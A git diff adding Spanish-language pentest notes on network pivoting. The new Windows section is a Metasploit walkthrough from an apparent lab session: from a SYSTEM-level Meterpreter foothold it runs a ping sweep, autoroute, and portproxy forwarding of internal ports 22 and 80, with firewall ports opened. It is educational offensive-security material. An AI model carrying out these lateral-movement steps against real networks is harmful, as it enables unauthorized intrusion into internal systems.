@@ -91,6 +91,8 @@ Cada dirección IPv4 está acompañada de una **máscara de subred**. Si conside
 
 Cuando un paquete o tráfico requiere ser dirigido a una dirección IP fuera de su propia red, el sistema lo redirige a la **puerta de enlace predeterminada** (default gateway). Esta puerta de enlace, generalmente, es la dirección IP de un dispositivo que actúa como enrutador para esa LAN en particular. Desde la perspectiva de la pivotación en ciberseguridad, es esencial comprender las redes a las que un sistema comprometido puede acceder. Por ello, es de suma importancia documentar toda la información relacionada con direcciones IP durante un compromiso, ya que esto puede ser vital en fases posteriores del análisis.
 
+
+## Pivoting en Linux
 ### Creación de payload
 
 Primero crearemos un payload con `msfvenom`, poniendo la situación de que ya hemos tomado acceso a un activo dentro de la red.
@@ -641,7 +643,186 @@ Ethernet adapter Ethernet1 2:
    Default Gateway . . . . . . . . . : 
 
 C:\Windows>
+```
+
+## Pivoting en Windows
+
+Para el caso de Windows cambian ciertos puntos para establecer un correcto enrutamiento de la redes. Una vez tenemos nuestra sesión meterpreter establecida de la máquina Windows y detectamos una IP en la que no tenemos alcance, seguiremos los siguientes pasos para un pivoting con éxito:
+
+```bash
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  11
+============
+Name         : Adapter #0
+Hardware MAC : 00:50:56:b9:21:25
+MTU          : 1500
+IPv4 Address : 10.129.3.88
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::dc2f:8fa1:536b:6328
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+Interface 12
+============
+Name         : Adapter #1
+Hardware MAC : 00:50:56:b9:4b:8e
+MTU          : 1500
+IPv4 Address : 172.16.5.129
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::250:56ff:feb9:4b8e
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
 
 ```
+
+Buscamos nuevos activos en la máquina víctima con el nuevo host detectado:
+
+```
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24
+
+[*] Performing ping sweep for IP range 172.16.5.0/24
+[+]     172.16.5.72 host found
+[+]     172.16.5.129 host found
+```
+
+
+Una vez detectamos una red en la que no tenemos alcance (172.16.5.129 y 172.16.5.72), procedemos a agregar rutas en nuestra máquina para dirigir el tráfico específico a través de la sesión de meterpreter comprometida con la utilidad ```post/multi/manage/autoroute```, en donde simplemente seleccionaremos la sesión activa:
+
+```bash
+meterpreter > bg
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > use post/multi/manage/autoroute 
+msf6 post(multi/manage/autoroute) > show options
+
+Module options (post/multi/manage/autoroute):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoad
+                                       d, print, delete, default)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
+   SESSION                   yes       The session to run this module on
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+
+msf6 post(multi/manage/autoroute) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM         10.10.14.49:4444 -> 10.129.3.88:33520  (10.129.3.88)
+
+msf6 post(multi/manage/autoroute) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/autoroute) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running module against 10.129.3.88
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.3.0/255.255.255.0 from host's routing table.
+[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.3.0         255.255.255.0      Session 1
+   172.16.5.0         255.255.255.0      Session 1
+
+[*] There are currently no IPv6 routes defined.
+```
+
+Ahora utilizamos la funcionalidad "PortProxy" de Windows para redirigir el tráfico de un puerto en particular en el host interno 172.16.5.72 con la utilidad ```post/windows/manage/portproxy```:
+
+```bash
+msf6 post(multi/manage/autoroute) > use post/windows/manage/portproxy 
+msf6 post(windows/manage/portproxy) > show options
+
+Module options (post/windows/manage/portproxy):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   CONNECT_ADDRESS                   yes       IPv4/IPv6 address to which to connect.
+   CONNECT_PORT                      yes       Port number to which to connect.
+   IPV6_XP          true             yes       Install IPv6 on Windows XP (needed for v4tov
+                                               4).
+   LOCAL_ADDRESS                     yes       IPv4/IPv6 address to which to listen.
+   LOCAL_PORT                        yes       Port number to which to listen.
+   SESSION                           yes       The session to run this module on
+   TYPE             v4tov4           yes       Type of forwarding (Accepted: v4tov4, v6tov6
+                                               , v6tov4, v4tov6)
+
+msf6 post(windows/manage/portproxy) > set CONNECT_ADDRESS 172.16.5.72
+CONNECT_ADDRESS => 172.16.5.72
+msf6 post(windows/manage/portproxy) > set CONNECT_PORT 80
+CONNECT_PORT => 80
+msf6 post(windows/manage/portproxy) > set LOCAL_ADDRESS 0.0.0.0
+LOCAL_ADDRESS => 0.0.0.0
+msf6 post(windows/manage/portproxy) > set LOCAL_PORT 6080
+LOCAL_PORT => 6080
+msf6 post(windows/manage/portproxy) > set SESSION 1
+SESSION => 1
+msf6 post(windows/manage/portproxy) > run
+
+[*] Setting PortProxy ...
+[+] PortProxy added.
+[*] Port Forwarding Table
+=====================
+
+   LOCAL IP  LOCAL PORT  REMOTE IP     REMOTE PORT
+   --------  ----------  ---------     -----------
+   0.0.0.0   6080        172.16.5.72   80
+
+[*] Setting port 6080 in Windows Firewall ...
+[+] Port opened in Windows Firewall.
+[*] Post module execution completed
+msf6 post(windows/manage/portproxy) > set CONNECT_PORT 22 
+CONNECT_PORT => 22
+msf6 post(windows/manage/portproxy) > set LOCAL_PORT 6022
+LOCAL_PORT => 6022
+msf6 post(windows/manage/portproxy) > run
+
+[*] Setting PortProxy ...
+[+] PortProxy added.
+[*] Port Forwarding Table
+=====================
+
+   LOCAL IP  LOCAL PORT  REMOTE IP     REMOTE PORT
+   --------  ----------  ---------     -----------
+   0.0.0.0   6080        172.16.5.72   80
+   0.0.0.0   6022        172.16.5.72   22
+
+[*] Setting port 6022 in Windows Firewall ...
+[+] Port opened in Windows Firewall.
+[*] Post module execution completed
+msf6 post(windows/manage/portproxy) > 
+```
+
+Finalmente podremos trabajar desde nuestra máquina atacante de forma normal con la IP que teníamos alcance desde un principio que es la 10.129.3.88. Es decir, si queremos realizar un nmap se tendría que escanear de la siguiente forma:
+
+```bash
+┌─[root@kali]─[/home/user/pivoting]
+└──╼ nmap -sVC 10.129.3.88 -p6022,6080              
+```
+
+
 
 > Desde el punto de vista defensivo todas estas conexiones se pueden visualizar por medio de ```netstat -antp```.
